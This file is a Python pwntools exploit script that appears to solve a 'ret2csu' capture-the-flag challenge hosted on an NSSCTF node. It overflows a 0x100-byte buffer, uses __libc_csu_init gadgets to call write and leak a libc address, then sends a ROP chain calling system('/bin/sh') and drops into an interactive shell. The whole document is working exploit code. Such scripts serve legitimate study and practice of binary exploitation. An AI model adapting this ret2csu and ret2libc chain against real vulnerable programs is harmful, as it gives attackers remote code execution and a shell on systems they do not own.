#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
os_level = 64
binary_name = 'ret2csu'
remote_addr, port = 'node5.anna.nssctf.cn:27349'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.sym[func]
        system = base + libc.sym['system']
        bin_sh = base + next(libc.search(b'/bin/sh'))

    return (system, bin_sh)

csu_front_addr = 0x401290
csu_end_addr = 0x4012AA

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r15 should be the function we want to call
    # rdi=edi=r12d
    # rsi=r13
    # rdx=r14
    payload = b'a' * 0x100 + b'b'*0x8
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a'*0x38 # remove all pop
    payload += p64(last)
    return payload

#Main function
if __name__ == '__main__':
    #you can add your code here
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    read_got = elf.got['read']
    data_base = elf.bss()
    main = elf.sym['main']

    payload = csu(0,1,1,write_got,8,write_got,main)
    sla('Input:\n',payload)
    rl()

    write_addr = u64(rc(6).ljust(8,b'\x00'))
    display('write',write_addr)
    system, bin_sh = ret2libc(write_addr,'write','/lib/x86_64-linux-gnu/libc.so.6')
    display('system',system)
    display('bin_sh',bin_sh)

    prdi = 0x4012b3
    ret = 0x40101a
    payload = b'a'*0x100 + b'b'*0x8 + p64(prdi) + p64(bin_sh) + p64(ret) + p64(system)
    sla('Input:\n',payload)
    p.interactive()
